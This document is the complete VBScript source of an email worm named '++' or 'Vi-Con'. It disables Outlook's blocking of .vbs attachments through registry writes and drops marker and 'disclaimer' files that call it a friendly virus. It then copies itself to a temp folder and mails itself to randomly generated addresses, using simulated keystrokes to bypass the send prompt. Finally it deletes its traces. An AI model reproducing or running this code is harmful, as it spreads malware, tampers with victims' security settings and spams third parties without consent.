Set WshShell = WScript.CreateObject("WScript.Shell")

WshShell.RegWrite "HKCU\Software\Microsoft\Office\10.0\Outlook\Security", 1 ,"REG_SZ"
WshShell.RegWrite "HKCU\Software\Microsoft\Office\10.0\Outlook\Security\Level1Remove", "vbs"
WshShell.RegWrite "HKCU\Software\Microsoft\Office\11.0\Outlook\Security", 1 ,"REG_SZ"
WshShell.RegWrite "HKCU\Software\Microsoft\Office\11.0\Outlook\Security\Level1Remove", "vbs"

mytime = now
host = "c:\windows\temp\++\" 
Set check = WScript.CreateObject("Scripting.FileSystemObject")  

 If Not check.FolderExists(host) Then 
 Set waiting = check.CreateFolder(host)
 Set guest = waiting.CreatetextFile("++.txt", True) 

  guest.WriteLine("                    *                    ") 
  guest.WriteLine("                  *    *               * ") 
  guest.WriteLine("                 *       *              *") 
  guest.WriteLine(" 		   *         *          * * ") 
  guest.WriteLine("                 *    *    *       *     ") 
  guest.WriteLine("                 *  *    *  *    *       ") 
  guest.WriteLine("  			        * *         ") 
  guest.WriteLine("                                 *       ") 
  guest.WriteLine("   				       *    ")  				         
  guest.WriteLine("")  		
  guest.WriteLine("i layed on your computer")  		
  guest.WriteLine("    on " & mytime)  		
  guest.WriteLine("")  		
  guest.WriteLine("++")  		
  guest.Close 

  Set disclaimer = waiting.CreatetextFile("disclaimer.txt", True) 
  disclaimer.WriteLine("") 
  disclaimer.WriteLine("") 
  disclaimer.WriteLine("      ++ is a virus that entered your system on " & Mytime) 
  disclaimer.WriteLine("")  
  disclaimer.WriteLine("      it didn't cause any damage to your computer") 
  disclaimer.WriteLine("      nor it will do so in the future. ") 
  disclaimer.WriteLine("      it's been a friendly passage.") 
  disclaimer.WriteLine("")
  disclaimer.WriteLine("      {www.vi-con.net}" )
  disclaimer.Close 

  end if

 on error resume next

 Set WshShell = WScript.CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\++\", 1 ,"REG_DWORD"
 WshShell.RegWrite "HKCU\++\Value", "Vi-Con"

 set temporaryhome=createobject ("scripting.filesystemobject")		
 temporaryhome.MoveFile WScript.ScriptFullname, "c:\windows\temp\++.vbs"    

randomize 

pillow = Int(50*Rnd ) +10
WScript.Sleep(1000)*pillow

call sublook

sub sublook

 Randomize

 abba = Int(5*Rnd) +1         
 tit = 0

 Do while abba <> 10 

    Randomize

    abc = int(rnd(1) * 8) + 2                 
  
    For intCounter = 1 To abc                 
 
       Randomize 
       intDecimal = Int((26 * Rnd) + 1) + 96      
       str = str & Chr(intDecimal)                  
     
    when = int(rnd(1) * 10) + 1                  

    select case when

      case 1
      a="@hotmail.com"
      case 2
      a="@msn.com"
      case 3
      a="@email.com"
      case 4
      a="@yahoo.com"
      case 5
      a="@excite.com"
      case 6
      a="@libero.it"
      case 7
      a="@tin.it"
      case 8
      a="@lycos.com"
      case 9
      a="@email.it"
      case 10
      a="@aol.com"
      end select

    Next

   abba = abba +1
   one = str & a
   many = many  & " ; " + str & a
   str = null

 loop

  on error resume next

  Set myOlApp = CreateObject("Outlook.Application")
  Set myItem = myOlApp.CreateItem(olMailItem)
  myItem.To = one
  myItem.cc = many
  Set myAttachments = myItem.Attachments
  myAttachments.Add "C:\windows\temp\++.vbs"
  myItem.Subject = "Vi-Con"
  myItem.Body = "+_+"
  myItem.display
  set WshShell = WScript.CreateObject("WScript.Shell")
  myItem.DeleteAfterSubmit = True
  wshShell.SendKeys "+^{TAB 2}{ENTER}"
    				 
  set fso=createobject ("scripting.filesystemobject")			 
  fso.Deletefile "C:\Windows\Temp\++.vbs"  

end sub

WScript.sleep(10000)

WshShell.RegDelete "HKCU\Software\Microsoft\Office\10.0\Outlook\Security\Level1Remove"
WshShell.RegDelete "HKCU\Software\Microsoft\Office\11.0\Outlook\Security\Level1Remove"
